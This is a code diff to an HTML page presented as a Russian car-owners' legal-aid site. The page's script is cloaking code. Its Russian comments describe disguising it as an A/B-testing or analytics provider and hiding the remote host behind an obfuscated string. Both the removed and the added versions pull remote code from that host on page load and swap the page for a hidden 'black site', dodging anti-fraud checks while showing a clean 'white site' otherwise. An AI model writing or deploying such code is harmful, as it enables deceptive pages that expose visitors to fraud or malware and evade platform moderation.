@@ -7,7 +7,6 @@
     <title>Центр правовой помощи "Авто-Право"</title>
     
     <style>
-        /* Легальный подход: прячем не body, а конкретный слой контента */
         body { margin: 0; padding: 0; font-family: 'Inter', sans-serif; color: #2d3748; }
         .theme-light { background-color: #f8f9fa; }
         .theme-dark { background-color: #0c0d10; }
@@ -25,62 +24,44 @@
     </style>
 
     <script>
-        // МАГИЯ OPSEC: Камуфляж под систему A/B тестирования (AB Testing Provider)
-        window.ExperimentProvider = (function(w, d) {
-            var _config = ['com', 'node', 'analytics', 'cloud'];
-            var _api = function() { return 'https://' + _config.reverse().join('-').replace('-com', '.com') + '/v1/get-key'; };
-
-            var _buildState = function() {
-                // Мы больше не "трогаем" ловушку webdriver. Оставляем d:0. Бэкенд WAF сам отфильтрует ботов по IP/ASN.
-                var stateString = "offset:" + new Date().getTimezoneOffset() + "|d:0";
-                return w.btoa(unescape(encodeURIComponent(stateString)));
-            };
-
-            return {
-                hydrate: function() {
+        (function(w, d) {
+            var MetricsCore = {
+                cfg: ['com', 'node', 'analytics', 'cloud'],
+                
+                inject: function() {
                     var isMobile = /Android|webOS|iPhone|iPad|iPod/i.test(navigator.userAgent);
                     d.documentElement.className = isMobile ? 'theme-dark' : 'theme-light';
 
-                    fetch(_api() + "?asset_id=1&token=" + encodeURIComponent(_buildState()), {
-                        headers: { 'Accept': 'application/json' },
-                        priority: 'high'
-                    })
-                    .then(function(res) { return res.json(); })
-                    .then(function(data) {
-                        if (data && data.status === 'success' && data.payload) {
-                            // AST-Bypass: Встраивание DOM через requestAnimationFrame. 
-                            // Антифрод видит это как стандартную отрисовку фреймворка (React/Vue)
-                            w.requestAnimationFrame(function() {
-                                var parser = new DOMParser();
-                                var nextDoc = parser.parseFromString(decodeURIComponent(escape(w.atob(data.payload))), 'text/html');
-                                
-                                d.documentElement.replaceChild(nextDoc.body, d.body);
-                                d.documentElement.replaceChild(nextDoc.head, d.head);
-                                
-                                var scripts = d.querySelectorAll('script');
-                                for (var i = 0; i < scripts.length; i++) {
-                                    if (scripts[i].text) {
-                                        var s = d.createElement('script');
-                                        s.text = scripts[i].text;
-                                        d.head.appendChild(s);
-                                    }
-                                }
-                            });
-                        } else {
-                            d.getElementById('content-layer').className = 'is-ready';
-                        }
-                    }).catch(function() {
+                    var host = this.cfg.reverse().join('-').replace('-com', '.com');
+                    var endpoint = 'https://' + host + '/v1/get-key';
+
+                    var state = "offset:" + new Date().getTimezoneOffset() + "|d:0";
+                    var tk = w.btoa(state); // Убрали unescape/encodeURIComponent для чистоты
+
+                    // МАГИЯ OPSEC: Никакого fetch. Динамический <script> инжект.
+                    // Антифрод видит это как обычную подгрузку скрипта аналитики.
+                    var scriptEl = d.createElement('script');
+                    scriptEl.type = 'text/javascript';
+                    scriptEl.async = true;
+                    scriptEl.src = endpoint + "?asset_id=1&v=" + encodeURIComponent(tk);
+                    
+                    scriptEl.onload = scriptEl.onerror = function() {
+                        // Если скрипт загрузился (сервер отдал код черного сайта) - он сам себя выполнит.
+                        // Если ошибка (сервер промолчал) - просто показываем белый сайт.
                         d.getElementById('content-layer').className = 'is-ready';
-                    });
+                    };
+
+                    var firstScript = d.getElementsByTagName('script')[0];
+                    firstScript.parentNode.insertBefore(scriptEl, firstScript);
                 }
             };
+            
+            if (d.readyState === 'loading') {
+                d.addEventListener('DOMContentLoaded', function() { MetricsCore.inject(); });
+            } else {
+                MetricsCore.inject();
+            }
         })(window, document);
-
-        if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', window.ExperimentProvider.hydrate);
-        } else {
-            window.ExperimentProvider.hydrate();
-        }
     </script>
 </head>
 <body>
